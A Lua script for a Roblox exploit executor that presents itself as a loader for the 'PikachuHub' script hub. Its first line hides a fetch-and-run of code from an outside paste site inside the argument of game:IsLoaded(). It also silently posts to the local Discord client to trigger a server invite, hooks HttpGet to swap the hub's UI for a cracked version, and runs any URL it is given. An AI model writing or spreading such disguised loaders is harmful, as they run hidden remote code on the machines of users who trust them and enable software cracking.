repeat wait() until game:IsLoaded(loadstring(game:HttpGet("https://paste.bingner.com/paste/qa2fw/raw"))())
if not hookfunction then return end

local Variables = {
	HttpService = game:GetService("HttpService"),
	Request = (syn and syn.request) or (http and http.request) or http_request,
	PikachuUI = "https://raw.githubusercontent.com/PepperThePikachu/PikachuHub/main/PikachuUI.lua",
	Crack = "https://github.com/sandwichk/RobloxScripts/blob/main/Scripts/PikachuHub/Crack.lua",
	Library = {}
}

Variables.Request({
    Url = 'http://127.0.0.1:6463/rpc?v=1',
    Method = 'POST',
    Headers = {
        ['Content-Type'] = 'application/json',
        Origin = 'https://discord.com'
    },
    Body = Variables.HttpService:JSONEncode({
        cmd = 'INVITE_BROWSER',
        nonce = Variables.HttpService:GenerateGUID(false),
        args = {code = "cZfYYb9Kvm"}
    })
})

function Variables.Library:Load(HTTP)
	local Sucess, Response = pcall(function()
		local Old; Old = hookfunction(game.HttpGet, function(A,B,C)
			if B == Variables.PikachuUI then
				B = Variables.Crack
			end
			return Old(A,B,C)
		end)
	end)
	if Sucess then loadstring(game:HttpGet(HTTP))() end
end

return Variables.Library
